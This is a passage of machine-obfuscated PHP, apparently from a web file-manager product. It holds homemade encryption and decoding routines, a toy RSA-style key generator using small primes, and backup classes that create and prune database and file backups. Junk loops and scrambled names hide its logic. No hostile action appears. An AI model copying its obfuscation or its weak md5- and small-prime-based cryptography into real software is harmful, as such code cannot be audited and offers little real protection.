$¶éù™ç[295]; } private function ayxzb78d44c2($‘áß¾ôµ, $Û•óòú, $çÓ˜§“³ = 3) { $¢Úåˆòß =& $_SERVER[•€áå–Õ]; $˜ç©Ôğ =& $_SERVER[ÛóøÜ¾æ]; usleep(1); $æ‰ÛÂËù = $¢Úåˆòß[733]; while (strlen($æ‰ÛÂËù) < $¢Úåˆòß[670]) { if (!$æ‰ÛÂËù) { break; } $æ‰ÛÂËù++; } $‘áß¾ôµ = trim($‘áß¾ôµ); $ä×Ø§Ò = mt_rand(0, 5) . $˜ç©Ôğ[6]; $åÃÁ¦” = $¢Úåˆòß[734]; while (strlen($åÃÁ¦”) < $¢Úåˆòß[670]) { if (!$åÃÁ¦”) { break; } $åÃÁ¦”++; } $ˆŒÎŒóÓ = rand_string(15); $İËá‰è§ = $¢Úåˆòß[735]; if (!$İËá‰è§) { return; } $íØú©’— = $˜ç©Ôğ[296]; switch ($ä×Ø§Ò) { case $˜ç©Ôğ[205]: $â½¯Úâº = $this->zlgt9bf76607($‘áß¾ôµ, strrev($Û•óòú . $ˆŒÎŒóÓ)); break; $ß™«î = $¢Úåˆòß[736]; if (strlen($ß™«î) < $¢Úåˆòß[670]) { die; } case $˜ç©Ôğ[122]: $â½¯Úâº = $this->zlgt9bf76607($‘áß¾ôµ, strrev($ˆŒÎŒóÓ . $Û•óòú)); break; case $˜ç©Ôğ[297]: $â½¯Úâº = $this->zlgt9bf76607($‘áß¾ôµ, base64_encode($ˆŒÎŒóÓ . $Û•óòú)); $‹ˆÔ¶¼Ô = $¢Úåˆòß[737]; if (!$‹ˆÔ¶¼Ô) { die; } break; $€†¤œ´Ã = $¢Úåˆòß[738]; case $˜ç©Ôğ[298]: $â½¯Úâº = $this->zlgt9bf76607($‘áß¾ôµ, md5($ˆŒÎŒóÓ . $Û•óòú)); break; $Ğ¢±‘Éı = $¢Úåˆòß[739]; if (strlen($Ğ¢±‘Éı) < $¢Úåˆòß[677]) { return; } case $˜ç©Ôğ[299]: $‘áß¾ôµ = base64_encode($‘áß¾ôµ); $×ŒØ™€ğ = rand(0, 64); $„ıáäåˆ = $¢Úåˆòß[740]; if (!$„ıáäåˆ) { return; } $¯ä“Ìåü = $íØú©’—[$×ŒØ™€ğ]; $ó­¡üµÅ = $¢Úåˆòß[741]; while ($ó­¡üµÅ < $¢Úåˆòß[666]) { if ($ó­¡üµÅ >= 0) { break; } $ó­¡üµÅ++; } $Ï”«‚Îæ = md5($¯ä“Ìåü . md5($Û•óòú . $¯ä“Ìåü) . $Û•óòú); $Ï”«‚Îæ = substr($Ï”«‚Îæ, $×ŒØ™€ğ % 8, $×ŒØ™€ğ % 8 + 7); $Ì½çÅ¡ = $˜ç©Ôğ[6]; $—×ù‚ÂÌ = $¢Úåˆòß[742]; if (strlen($—×ù‚ÂÌ) < $¢Úåˆòß[670]) { return; } $ïŸ™ö½ò = 0; $ŸØ“ËÈ = 0; $ĞÌˆ–ş = 0; $ïæ‹„¾ = $¢Úåˆòß[743]; if (!$ïæ‹„¾) { return; } for ($ïŸ™ö½ò = 0; $ïŸ™ö½ò < strlen($‘áß¾ôµ); $ïŸ™ö½ò++) { $ĞÌˆ–ş = $ĞÌˆ–ş == strlen($Ï”«‚Îæ) ? 0 : $ĞÌˆ–ş; $ŸØ“ËÈ = ($×ŒØ™€ğ + strpos($íØú©’—, $‘áß¾ôµ[$ïŸ™ö½ò]) + ord($Ï”«‚Îæ[$ĞÌˆ–ş++])) % 64; $Ì½çÅ¡ .= $íØú©’—[$ŸØ“ËÈ]; } $â½¯Úâº = hash_encode($¯ä“Ìåü . $Ì½çÅ¡); $««ÆğòË = $¢Úåˆòß[744]; while ($««ÆğòË < $¢Úåˆòß[670]) { if ($««ÆğòË >= 0) { break; } $««ÆğòË++; } break; $¨ô–…ßù = $¢Úåˆòß[745]; while (strlen($¨ô–…ßù) < $¢Úåˆòß[13]) { if (!$¨ô–…ßù) { break; } $¨ô–…ßù++; } default: $â½¯Úâº = $this->zlgt9bf76607($‘áß¾ôµ, $Û•óòú . $ˆŒÎŒóÓ); $§…Èë·’ = $¢Úåˆòß[746]; if (!$§…Èë·’) { die; } break; } $â½¯Úâº = strrev($ä×Ø§Ò . $ˆŒÎŒóÓ . $â½¯Úâº); if ($çÓ˜§“³ - 1 > 0) { $â½¯Úâº = $this->ayxzb78d44c2($â½¯Úâº, $Û•óòú, $çÓ˜§“³ - 1); } return $â½¯Úâº; } private function luefb44edbf7($Üè»ÈÇ, $ã÷º‡, $ñ²õ“ğÅ = 3) { $Ñ¡…ÍÛÑ =& $_SERVER[•€áå–Õ]; $Ñ‘ÖñÇ =& $_SERVER[ÛóøÜ¾æ]; if (!is_string($Üè»ÈÇ) || strlen($Üè»ÈÇ) < 10) { return !1; } $Üè»ÈÇ = trim($Üè»ÈÇ); $×ÑÕ¬ = $Ñ¡…ÍÛÑ[747]; if (!$×ÑÕ¬) { die; } $Üè»ÈÇ = strrev($Üè»ÈÇ); $Ú°¦Ğ¦ı = $Üè»ÈÇ[0]; $û¡‰ğú— = $Ñ¡…ÍÛÑ[748]; while ($û¡‰ğú— < $Ñ¡…ÍÛÑ[677]) { if ($û¡‰ğú— >= 0) { break; } $û¡‰ğú—++; } $¤†²ìÂõ = substr($Üè»ÈÇ, 1, 15); $İ­ùÒÛ = $Ñ¡…ÍÛÑ[749]; if (!$İ­ùÒÛ) { return; } $Üè»ÈÇ = substr($Üè»ÈÇ, 16); $´†õÎ½ = $Ñ‘ÖñÇ[296]; $æÀŒÂïÊ = $Ñ¡…ÍÛÑ[750]; switch ($Ú°¦Ğ¦ı) { case $Ñ‘ÖñÇ[205]: $×Ø›Çç¿ = $this->wubf57765344($Üè»ÈÇ, strrev($ã÷º‡ . $¤†²ìÂõ)); break; $çŸ÷ı¢Ñ = $Ñ¡…ÍÛÑ[751]; if (strlen($çŸ÷ı¢Ñ) < $Ñ¡…ÍÛÑ[673]) { return; } case $Ñ‘ÖñÇ[122]: $×Ø›Çç¿ = $this->wubf57765344($Üè»ÈÇ, strrev($¤†²ìÂõ . $ã÷º‡)); $ˆâÛ¦ä… = $Ñ¡…ÍÛÑ[752]; if (strlen($ˆâÛ¦ä…) < $Ñ¡…ÍÛÑ[677]) { die; } break; case $Ñ‘ÖñÇ[297]: $×Ø›Çç¿ = $this->wubf57765344($Üè»ÈÇ, base64_encode($¤†²ìÂõ . $ã÷º‡)); $è†“¢Œ¹ = $Ñ¡…ÍÛÑ[753]; if (!$è†“¢Œ¹) { return; } break; case $Ñ‘ÖñÇ[298]: $×Ø›Çç¿ = $this->wubf57765344($Üè»ÈÇ, md5($¤†²ìÂõ . $ã÷º‡)); break; $•¡ş¼éÕ = $Ñ¡…ÍÛÑ[754]; if (!$•¡ş¼éÕ) { die; } case $Ñ‘ÖñÇ[299]: $Üè»ÈÇ = hash_decode($Üè»ÈÇ); $ç£¦Š»Ë = $Ñ¡…ÍÛÑ[755]; if (strlen($ç£¦Š»Ë) < $Ñ¡…ÍÛÑ[13]) { die; } $èÑ¤ÑÌ = $Üè»ÈÇ[0]; $—±´ÌÍŒ = $Ñ¡…ÍÛÑ[756]; $Üè»ÈÇ = substr($Üè»ÈÇ, 1); $¢ô›²Øµ = strpos($´†õÎ½, $èÑ¤ÑÌ); $ôÉ½¢¹ = md5($èÑ¤ÑÌ . md5($ã÷º‡ . $èÑ¤ÑÌ) . $ã÷º‡); $¸ï°áëç = $Ñ¡…ÍÛÑ[757]; if (!$¸ï°áëç) { return; } $ôÉ½¢¹ = substr($ôÉ½¢¹, $¢ô›²Øµ % 8, $¢ô›²Øµ % 8 + 7); $Ï´¨åŒ± = $Ñ¡…ÍÛÑ[758]; $ÌÉ÷ª—é = $Ñ‘ÖñÇ[6]; $õú’œèÓ = 0; $á®íİ·Ç = 0; $Ãã°ù = $Ñ¡…ÍÛÑ[759]; while (strlen($Ãã°ù) < $Ñ¡…ÍÛÑ[13]) { if (!$Ãã°ù) { break; } $Ãã°ù++; } $ÏÜáØ†æ = 0; $†ÄœÊÕ‚ = $Ñ¡…ÍÛÑ[760]; while ($†ÄœÊÕ‚ < $Ñ¡…ÍÛÑ[673]) { if ($†ÄœÊÕ‚ >= 0) { break; } $†ÄœÊÕ‚++; } for ($õú’œèÓ = 0; $õú’œèÓ < strlen($Üè»ÈÇ); $õú’œèÓ++) { $ÏÜáØ†æ = $ÏÜáØ†æ == strlen($ôÉ½¢¹) ? 0 : $ÏÜáØ†æ; $µØÀîú = $Ñ¡…ÍÛÑ[761]; if (!$µØÀîú) { die; } $ú¤´¹ = $ÏÜáØ†æ++; $á®íİ·Ç = strpos($´†õÎ½, $Üè»ÈÇ[$õú’œèÓ]) - $¢ô›²Øµ - ord($ôÉ½¢¹[$ú¤´¹]); while ($á®íİ·Ç < 0) { $á®íİ·Ç += 64; } $ÌÉ÷ª—é .= $´†õÎ½[$á®íİ·Ç]; $š‡ûÜ÷¦ = $Ñ¡…ÍÛÑ[760]; if (!$š‡ûÜ÷¦) { return; } } $×Ø›Çç¿ = base64_decode($ÌÉ÷ª—é); $´Ş‘³ññ = $Ñ¡…ÍÛÑ[762]; if (!$´Ş‘³ññ) { return; } break; $¾ÅØ™‰Ï = $Ñ¡…ÍÛÑ[763]; default: $×Ø›Çç¿ = $this->wubf57765344($Üè»ÈÇ, $ã÷º‡ . $¤†²ìÂõ); $ÆØÀÙŸƒ = $Ñ¡…ÍÛÑ[764]; while (strlen($ÆØÀÙŸƒ) < $Ñ¡…ÍÛÑ[677]) { if (!$ÆØÀÙŸƒ) { break; } $ÆØÀÙŸƒ++; } break; } if ($ñ²õ“ğÅ - 1 > 0) { $×Ø›Çç¿ = $this->luefb44edbf7($×Ø›Çç¿, $ã÷º‡, $ñ²õ“ğÅ - 1); } return $×Ø›Çç¿; } public function xqhj38dbcd76($­ÈŸ†É©) { $ŒÌŒƒ»ü =& $_SERVER[•€áå–Õ]; $È‘áÒµ =& $_SERVER[ÛóøÜ¾æ]; $ŒÈ¾œäú = $this->gmxr4450b24f(); $çÑØá¦ = $ŒÌŒƒ»ü[765]; if (strlen($çÑØá¦) < $ŒÌŒƒ»ü[666]) { die; } $¼Ğèìû¦ = $this->gmxr4450b24f(); $Š‰ºøä = ($ŒÈ¾œäú - 1) * ($¼Ğèìû¦ - 1); $êíé»õ© = $ŒÌŒƒ»ü[766]; $€‰Ô¥ÔŒ = intval(($ŒÈ¾œäú + $¼Ğèìû¦) / 2); $ÆÜ¿ÌÓ… = $ŒÌŒƒ»ü[767]; while (1) { $½§’‚”ø = $€‰Ô¥ÔŒ; $şªûĞß¿ = $Š‰ºøä; $øšÂØúÅ = $ŒÌŒƒ»ü[768]; if (strlen($øšÂØúÅ) < $ŒÌŒƒ»ü[670]) { die; } while ($şªûĞß¿ % $½§’‚”ø != 0) { $Œ•ù²à® = $şªûĞß¿; $ËÁ©í‚Á = $ŒÌŒƒ»ü[769]; if (strlen($ËÁ©í‚Á) < $ŒÌŒƒ»ü[666]) { return; } $şªûĞß¿ = $½§’‚”ø; $ìÒ ª¨” = $ŒÌŒƒ»ü[770]; while (strlen($ìÒ ª¨”) < $ŒÌŒƒ»ü[677]) { if (!$ìÒ ª¨”) { break; } $ìÒ ª¨”++; } $½§’‚”ø = $Œ•ù²à® % $½§’‚”ø; $¯Èİ¦Ÿô = $ŒÌŒƒ»ü[771]; while ($¯Èİ¦Ÿô < $ŒÌŒƒ»ü[677]) { if ($¯Èİ¦Ÿô >= 0) { break; } $¯Èİ¦Ÿô++; } } if ($½§’‚”ø == 1) { break; } else { $€‰Ô¥ÔŒ++; } } $‘İ¤ı±¤ = 2; $ºÔçï± = $ŒÌŒƒ»ü[772]; while ($ºÔçï± < $ŒÌŒƒ»ü[13]) { if ($ºÔçï± >= 0) { break; } $ºÔçï±++; } for ($Š˜Õö„ = 0; $Š˜Õö„ < $Š‰ºøä * 10; $Š˜Õö„++) { if (($Š‰ºøä * $Š˜Õö„ + 1) % $€‰Ô¥ÔŒ == 0) { $‘İ¤ı±¤ = intval(($Š‰ºøä * $Š˜Õö„ + 1) / $€‰Ô¥ÔŒ); break; } } $ø£¾û¥Ÿ = $this->zlgt9bf76607($ŒÈ¾œäú * $¼Ğèìû¦ . $È‘áÒµ[6], $È‘áÒµ[136]); $÷¦Ñ§«Å = $ŒÌŒƒ»ü[773]; if (strlen($÷¦Ñ§«Å) < $ŒÌŒƒ»ü[13]) { return; } $“ãßƒ°– = md5($È‘áÒµ[300] . ($ŒÈ¾œäú + $¼Ğèìû¦) . $È‘áÒµ[301] . $€‰Ô¥ÔŒ . $È‘áÒµ[301] . $‘İ¤ı±¤ . $È‘áÒµ[302]); $©½ı¿øÛ = $ŒÌŒƒ»ü[774]; while ($©½ı¿øÛ < $ŒÌŒƒ»ü[670]) { if ($©½ı¿øÛ >= 0) { break; } $©½ı¿øÛ++; } $Û¹’áß… = $this->zlgt9bf76607($­ÈŸ†É©, $“ãßƒ°–) . $È‘áÒµ[303] . $ø£¾û¥Ÿ; return $Û¹’áß…; } public function ibhadfec9487($ÍÀ——û–) { $÷”¨Ç¾º =& $_SERVER[•€áå–Õ]; $ï¥İĞ×Ñ =& $_SERVER[ÛóøÜ¾æ]; $›ä¡îıä = explode($ï¥İĞ×Ñ[303], $ÍÀ——û–); if (count($›ä¡îıä) != 2) { return $ï¥İĞ×Ñ[6]; } $ÎõŒ•È = $this->wubf57765344($›ä¡îıä[1] . $ï¥İĞ×Ñ[6], $ï¥İĞ×Ñ[136]); if (!$ÎõŒ•È) { return $ï¥İĞ×Ñ[6]; } $ÎõŒ•È = intval($ÎõŒ•È); $úÏÈÔ = 0; $˜âƒ“µ¼ = 0; $Ó¨½´à = $÷”¨Ç¾º[775]; for ($µÖı‡ª = 3; $µÖı‡ª < $ÎõŒ•È; $µÖı‡ª += 2) { if ($ÎõŒ•È % $µÖı‡ª != 0) { continue; } $úÏÈÔ = $µÖı‡ª; $˜âƒ“µ¼ = intval($ÎõŒ•È / $µÖı‡ª); $‚Öş‡• = $÷”¨Ç¾º[776]; if (strlen($‚Öş‡•) < $÷”¨Ç¾º[677]) { die; } break; $ùµ†éÉ = $÷”¨Ç¾º[777]; if (!$ùµ†éÉ) { die; } } $÷È¢Êä¾ = ($úÏÈÔ - 1) * ($˜âƒ“µ¼ - 1); $÷ëí»µó = intval(($úÏÈÔ + $˜âƒ“µ¼) / 2); while (1) { $µ×‰«åÚ = $÷ëí»µó; $»£ÁÚıİ = $÷È¢Êä¾; $şâ¾å™ì = $÷”¨Ç¾º[778]; if (strlen($şâ¾å™ì) < $÷”¨Ç¾º[13]) { die; } while ($»£ÁÚıİ % $µ×‰«åÚ != 0) { $¹¦Õ¢‹Î = $»£ÁÚıİ; $¥‰ƒõº• = $÷”¨Ç¾º[779]; if (strlen($¥‰ƒõº•) < $÷”¨Ç¾º[670]) { die; } $»£ÁÚıİ = $µ×‰«åÚ; $µ×‰«åÚ = $¹¦Õ¢‹Î % $µ×‰«åÚ; } if ($µ×‰«åÚ == 1) { break; } else { $÷ëí»µó++; } } $–›õ«·î = 2; for ($µÖı‡ª = 0; $µÖı‡ª < $÷È¢Êä¾ * 10; $µÖı‡ª++) { if (($÷È¢Êä¾ * $µÖı‡ª + 1) % $÷ëí»µó == 0) { $–›õ«·î = intval(($÷È¢Êä¾ * $µÖı‡ª + 1) / $÷ëí»µó); break; } } $‡ç³ôÎÕ = md5($ï¥İĞ×Ñ[300] . ($úÏÈÔ + $˜âƒ“µ¼) . $ï¥İĞ×Ñ[301] . $÷ëí»µó . $ï¥İĞ×Ñ[301] . $–›õ«·î . $ï¥İĞ×Ñ[302]); $Ù´õ Ü = $this->wubf57765344($›ä¡îıä[0], $‡ç³ôÎÕ); $¶±«èø  = $÷”¨Ç¾º[780]; if (!$¶±«èø ) { return; } return $Ù´õ Ü; } public function gmxr4450b24f() { $ãÑ°¡ö„ =& $_SERVER[•€áå–Õ]; $€‰øÁÎÇ = mt_rand(pow(2, 14), pow(2, 16) - 1); $–¼ÓÂŞÁ = $ãÑ°¡ö„[781]; if (strlen($–¼ÓÂŞÁ) < $ãÑ°¡ö„[677]) { die; } $¯½üÑ‚× = array(); $´ØÃËÑÎ = $ãÑ°¡ö„[782]; $¾ƒ¢è´ñ = 1; while ($¾ƒ¢è´ñ <= (int) sqrt($€‰øÁÎÇ)) { $ºí¯ÇŠ¬ = $¾ƒ¢è´ñ; $£Ê“ØĞÇ = $ãÑ°¡ö„[783]; while (strlen($£Ê“ØĞÇ) < $ãÑ°¡ö„[677]) { if (!$£Ê“ØĞÇ) { break; } $£Ê“ØĞÇ++; } while (!0) { $ºí¯ÇŠ¬++; $¤Ô×…†Ğ = $ãÑ°¡ö„[784]; while ($¤Ô×…†Ğ < $ãÑ°¡ö„[666]) { if ($¤Ô×…†Ğ >= 0) { break; } $¤Ô×…†Ğ++; } if ($ºí¯ÇŠ¬ <= 2) { $¾ƒ¢è´ñ = $ºí¯ÇŠ¬; break; } else { if ($ºí¯ÇŠ¬ < 2) { continue; } } $¾ş‹¸Œ½ = !0; for ($”ãò­Ï = 2; $”ãò­Ï <= sqrt($ºí¯ÇŠ¬); $”ãò­Ï++) { if ($ºí¯ÇŠ¬ % $”ãò­Ï == 0) { $¾ş‹¸Œ½ = !1; } } if ($¾ş‹¸Œ½) { $¾ƒ¢è´ñ = $ºí¯ÇŠ¬; break; } } $¯½üÑ‚×[] = $¾ƒ¢è´ñ; } $ÖÔ°½‰³ = 2; $­åùÑ°à = $ãÑ°¡ö„[785]; while (strlen($­åùÑ°à) < $ãÑ°¡ö„[673]) { if (!$­åùÑ°à) { break; } $­åùÑ°à++; } for ($ºí¯ÇŠ¬ = $€‰øÁÎÇ; $ºí¯ÇŠ¬ > 1; $ºí¯ÇŠ¬--) { $¾ş‹¸Œ½ = !0; foreach ($¯½üÑ‚× as $–èÑèĞç) { if ($ºí¯ÇŠ¬ % $–èÑèĞç == 0) { $¾ş‹¸Œ½ = !1; break; } } if ($¾ş‹¸Œ½) { $ÖÔ°½‰³ = $ºí¯ÇŠ¬; break; } } return $ÖÔ°½‰³; $şîİ°ûÁ = $ãÑ°¡ö„[786]; while (strlen($şîİ°ûÁ) < $ãÑ°¡ö„[13]) { if (!$şîİ°ûÁ) { break; } $şîİ°ûÁ++; } } public function sqjx86273145($ŒåÅ•¢®, $Ÿöš­†£) { $àâÖÁ‰ =& $_SERVER[•€áå–Õ]; $‡Ç ©Ïë =& $_SERVER[ÛóøÜ¾æ]; return call_user_func(array($‡Ç ©Ïë[8], $‡Ç ©Ïë[304]), $ŒåÅ•¢®, $Ÿöš­†£); $ğ¶¿ñÈÍ = $àâÖÁ‰[787]; while (strlen($ğ¶¿ñÈÍ) < $àâÖÁ‰[673]) { if (!$ğ¶¿ñÈÍ) { break; } $ğ¶¿ñÈÍ++; } } public function zlgt9bf76607($ÛÃÎÓŠØ, $ğéèÍ²š) { $Éûšå‹é =& $_SERVER[•€áå–Õ]; $§ÛÍññ¹ =& $_SERVER[ÛóøÜ¾æ]; return call_user_func(array($§ÛÍññ¹[305], $§ÛÍññ¹[306]), $ÛÃÎÓŠØ, $ğéèÍ²š); $É˜„¬İ´ = $Éûšå‹é[788]; while (strlen($É˜„¬İ´) < $Éûšå‹é[666]) { if (!$É˜„¬İ´) { break; } $É˜„¬İ´++; } } public function wubf57765344($óç¢‘Œ§, $ûéÖİëö) { $êŠ†¼ÒÚ =& $_SERVER[ÛóøÜ¾æ]; return call_user_func(array($êŠ†¼ÒÚ[305], $êŠ†¼ÒÚ[307]), $óç¢‘Œ§, $ûéÖİëö); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¥ãÊŠÇÊ =& $_SERVER[•€áå–Õ]; $this->isManual(); self::$name = date($¥ãÊŠÇÊ[789]); if (!($éáÉ¯ËÏ = Model($¥ãÊŠÇÊ[790])->lastItem())) { $éáÉ¯ËÏ = $this->initData(); } else { self::$name = $éáÉ¯ËÏ[$¥ãÊŠÇÊ[42]]; if ($éáÉ¯ËÏ[$¥ãÊŠÇÊ[791]] == $¥ãÊŠÇÊ[100]) { self::$name = date($¥ãÊŠÇÊ[266]); $Ó„×·öì = 0; if (isset($éáÉ¯ËÏ[$¥ãÊŠÇÊ[348]][$¥ãÊŠÇÊ[226]][$¥ãÊŠÇÊ[520]])) { $Ó„×·öì = (int) $éáÉ¯ËÏ[$¥ãÊŠÇÊ[348]][$¥ãÊŠÇÊ[226]][$¥ãÊŠÇÊ[520]]; } if (self::$manual == 0 && $éáÉ¯ËÏ[$¥ãÊŠÇÊ[42]] == self::$name) { Model($¥ãÊŠÇÊ[790])->remove($éáÉ¯ËÏ[$¥ãÊŠÇÊ[454]]); } $éáÉ¯ËÏ = $this->initData($Ó„×·öì, $éáÉ¯ËÏ[$¥ãÊŠÇÊ[792]]); } else { $this->checkStore($éáÉ¯ËÏ[$¥ãÊŠÇÊ[792]]); } } self::$option = $éáÉ¯ËÏ; } private function isManual() { $öõüŸ’™ = _get($GLOBALS, $_SERVER[•€áå–Õ][793], 0); $öõüŸ’™ = intval($öõüŸ’™); self::$manual = $öõüŸ’™ && $öõüŸ’™ == 1 ? 1 : 0; } private function initData($ëøñì‘õ = 0, $ºÚ†ĞÚò = '') { $·ƒî˜˜¢ =& $_SERVER[•€áå–Õ]; $û¸©ë = Model($·ƒî˜˜¢[790])->config(); if ($ºÚ†ĞÚò && $û¸©ë[$·ƒî˜˜¢[792]] != $ºÚ†ĞÚò) { $ëøñì‘õ = 0; } $this->checkStore($û¸©ë[$·ƒî˜˜¢[792]]); if (self::$manual == 1) { self::$name .= $·ƒî˜˜¢[21] . date($·ƒî˜˜¢[794]); } $‘¿—×º› = array($·ƒî˜˜¢[792] => $û¸©ë[$·ƒî˜˜¢[792]], $·ƒî˜˜¢[42] => self::$name, $·ƒî˜˜¢[791] => 0, $·ƒî˜˜¢[795] => $û¸©ë[$·ƒî˜˜¢[795]], $·ƒî˜˜¢[796] => self::$manual, $·ƒî˜˜¢[348] => array($·ƒî˜˜¢[797] => array($·ƒî˜˜¢[791] => 0), $·ƒî˜˜¢[798] => array($·ƒî˜˜¢[791] => 0, $·ƒî˜˜¢[799] => 0, $·ƒî˜˜¢[800] => 0, $·ƒî˜˜¢[43] => $·ƒî˜˜¢[22], $·ƒî˜˜¢[801] => 0, $·ƒî˜˜¢[802] => 0), $·ƒî˜˜¢[803] => array($·ƒî˜˜¢[791] => 0, $·ƒî˜˜¢[799] => 0, $·ƒî˜˜¢[800] => 0, $·ƒî˜˜¢[801] => 0, $·ƒî˜˜¢[802] => 0), $·ƒî˜˜¢[226] => array($·ƒî˜˜¢[791] => 0, $·ƒî˜˜¢[804] => 0, $·ƒî˜˜¢[805] => 0, $·ƒî˜˜¢[806] => 0, $·ƒî˜˜¢[807] => 0, $·ƒî˜˜¢[520] => $ëøñì‘õ, $·ƒî˜˜¢[801] => 0, $·ƒî˜˜¢[802] => 0)), $·ƒî˜˜¢[801] => time(), $·ƒî˜˜¢[802] => 0); $ÅÊëï§ğ = Model($·ƒî˜˜¢[790])->insert($‘¿—×º›); $‘¿—×º›[$·ƒî˜˜¢[454]] = $ÅÊëï§ğ; return $‘¿—×º›; } private function checkStore($‡¹ˆ²·™) { $™º°«Àº =& $_SERVER[•€áå–Õ]; $–ôœ™ = Model($™º°«Àº[808])->listData($‡¹ˆ²·™); Model($™º°«Àº[808])->checkConfig($–ôœ™); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[•€áå–Õ][790])->findByName(self::$name); } return self::$option; } public static function set($šª½š) { $×Àˆğ¯ =& $_SERVER[•€áå–Õ]; $ ™¸äíŒ = self::get(); foreach ($šª½š as $Ï†•ÂÀ¤ => $åŠŞáµü) { $’ÉŞ‚ëí = explode($×Àˆğ¯[20], $Ï†•ÂÀ¤); $…åÙ€Ê¿ = count($’ÉŞ‚ëí); switch ($…åÙ€Ê¿) { case 1: $ ™¸äíŒ[$’ÉŞ‚ëí[0]] = $åŠŞáµü; break; case 2: $ ™¸äíŒ[$’ÉŞ‚ëí[0]][$’ÉŞ‚ëí[1]] = $åŠŞáµü; break; case 3: $ ™¸äíŒ[$’ÉŞ‚ëí[0]][$’ÉŞ‚ëí[1]][$’ÉŞ‚ëí[2]] = $åŠŞáµü; break; } } Model($×Àˆğ¯[790])->update($ ™¸äíŒ[$×Àˆğ¯[454]], $ ™¸äíŒ); self::$option = $ ™¸äíŒ; return self::$option; } public function keep() { $‹ëØÔõú =& $_SERVER[•€áå–Õ]; $ÖÈÉ¢İì = self::get(); if ($ÖÈÉ¢İì[$‹ëØÔõú[348]][$‹ëØÔõú[797]][$‹ëØÔõú[791]] == $‹ëØÔõú[100]) { return; } $this->backupKeep($ÖÈÉ¢İì); self::set(array($‹ëØÔõú[809] => 1)); } private function backupKeep($âœ¸­™¥) { $ñåù’Ğ§ =& $_SERVER[•€áå–Õ]; if (self::$manual == 1) { return; } $´åó€ãÏ = Model($ñåù’Ğ§[790])->listData(); if (empty($´åó€ãÏ)) { return; } $Ô†Şà¦Ç = 0; $„ÆĞ£ñ = array(); foreach ($´åó€ãÏ as $àÌ‹í¨¢) { if ($Ô†Şà¦Ç >= 7) { break; } $„ÆĞ£ñ[] = $àÌ‹í¨¢[$ñåù’Ğ§[42]]; $Ô†Şà¦Ç++; } for ($Ô†Şà¦Ç = 0; $Ô†Şà¦Ç < 12; $Ô†Şà¦Ç++) { $„ÆĞ£ñ[] = date($ñåù’Ğ§[810], strtotime("\x2d{$Ô†Şà¦Ç}\x20\x6d\x6f\x6e\164\x68\x73")); } $„ÆĞ£ñ = array_unique($„ÆĞ£ñ); $ºùñ†åœ = Model($ñåù’Ğ§[811])->get($ñåù’Ğ§[812]); foreach ($´åó€ãÏ as $àÌ‹í¨¢) { if (isset($àÌ‹í¨¢[$ñåù’Ğ§[796]]) && $àÌ‹í¨¢[$ñåù’Ğ§[796]] == $ñåù’Ğ§[100]) { continue; } if (!empty($àÌ‹í¨¢[$ñåù’Ğ§[42]]) && in_array($àÌ‹í¨¢[$ñåù’Ğ§[42]], $„ÆĞ£ñ)) { continue; } Model($ñåù’Ğ§[790])->remove($àÌ‹í¨¢[$ñåù’Ğ§[454]]); $—™ªÆ¤Ú = $this->backupPath($âœ¸­™¥, $ºùñ†åœ); IO::remove($—™ªÆ¤Ú, !1); } } private function backupPath($Å¹¡ÆÂ, $ãüú×¬™ = false) { $–êÏŠ“Â =& $_SERVER[•€áå–Õ]; if (!$ãüú×¬™) { $ãüú×¬™ = Model($–êÏŠ“Â[811])->get($–êÏŠ“Â[812]); } $ƒíè¿º› = $Å¹¡ÆÂ[$–êÏŠ“Â[42]]; $Ëº—úÌã = substr(md5($–êÏŠ“Â[813] . $ãüú×¬™ . $ƒíè¿º›), 0, 8); return "\x7b\151\157\72{$Å¹¡ÆÂ[$–êÏŠ“Â[792]]}\175\x2f\x64\141\164\141\142\x61\163\x65\x2f\142\x61\143\153\165\x70\57" . $ƒíè¿º› . $–êÏŠ“Â[21] . $Ëº—úÌã; } public function db() { $®‘èÜá =& $_SERVER[•€áå–Õ]; $²‡óú­› = self::get(); if ($²‡óú­›[$®‘èÜá[348]][$®‘èÜá[798]][$®‘èÜá[791]] == $®‘èÜá[100]) { return !0; } $À•‡²ƒë = new BackupDb(); if (!$À•‡²ƒë->index()) { return !1; } self::set(array($®‘èÜá[814] => 1)); return !0; } public function dbFile() { $Ú„«€˜ø =& $_SERVER[•€áå–Õ]; $¸Œ–“÷Ó = self::get(); if ($¸Œ–“÷Ó[$Ú„«€˜ø[348]][$Ú„«€˜ø[803]][$Ú„«€˜ø[791]] == $Ú„«€˜ø[100]) { return !0; } $‚şÅ ö® = new BackupDbFile(); if (!$‚şÅ ö®->index()) { return !1; } self::set(array($Ú„«€˜ø[815] => 1)); return !0; } public function file() { $¦‹àıÀ =& $_SERVER[•€áå–Õ]; $ŠÎªŞöÔ = self::get(); if ($ŠÎªŞöÔ[$¦‹àıÀ[348]][$¦‹àıÀ[226]][$¦‹àıÀ[791]] == $¦‹àıÀ[100]) { return !0; } if (!isset($ŠÎªŞöÔ[$¦‹àıÀ[795]]) || $ŠÎªŞöÔ[$¦‹àıÀ[795]] == $¦‹àıÀ[224]) { $¿É†§Ö› = new BackupFile(); if (!$¿É†§Ö›->index()) { return !1; } } self::set(array($¦‹àıÀ[816] => 1, $¦‹àıÀ[791] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÁŠÔ™¦ =& $_SERVER[•€áå–Õ]; $£ÏõúÌÓ = Backup::get(); self::$io = $£ÏõúÌÓ[$ÁŠÔ™¦[792]]; self::$name = $£ÏõúÌÓ[$ÁŠÔ™¦[42]]; $•‹È½º‹ = new DbManage(); $Ê¨òúï = $•‹È½º‹->dbType(); $íÄì¯¬“ = array($ÁŠÔ™¦[817] => $Ê¨òúï, $ÁŠÔ™¦[818] => time()); Backup::set($íÄì¯¬“); $õşĞ€ˆ = $this->tmpFilesPath() . $ÁŠÔ™¦[819] . self::$name . $ÁŠÔ™¦[18]; del_dir($õşĞ€ˆ); mk_dir($õşĞ€ˆ); $ìØÕ« ’ = $ºŠä¸¯á = 0; $Êş¦ÅÌù = new Task($ÁŠÔ™¦[820], $ÁŠÔ™¦[821], 0, LNG($ÁŠÔ™¦[822]) . $ÁŠÔ™¦[823] . LNG($ÁŠÔ™¦[824])); try { $Ø¼ÄØˆ = $•‹È½º‹->db()->getTables(); } catch (Exception $²ÀûèºÜ) { $Êş¦ÅÌù->end(); return !1; } $Ø¼ÄØˆ = array_diff($Ø¼ÄØˆ, array($ÁŠÔ™¦[825], 